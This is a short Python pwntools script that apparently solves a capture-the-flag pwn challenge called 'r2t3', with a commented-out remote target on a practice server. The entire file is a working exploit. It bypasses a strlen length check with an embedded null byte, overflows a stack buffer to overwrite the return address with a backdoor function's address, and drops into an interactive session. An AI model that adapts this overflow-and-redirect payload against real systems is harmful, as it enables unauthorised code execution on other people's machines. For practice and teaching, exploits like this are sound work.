from pwn import *
context.arch = 'i386'

p = process('./r2t3')
# p = remote('node3.buuoj.cn',26564)
elf = ELF('./r2t3',checksec=False)

backdoor = elf.sym['_dl_registery']

payload = 'A'*5 + '\0'*0x14 + p32(backdoor)	# pass the check   v3 = strlen(s);  if ( v3 <= 3u || v3 > 8u )
# payload = payload.ljust(0x14,'B') + p32(backdoor)
p.send(payload)
sleep(1)
p.interactive()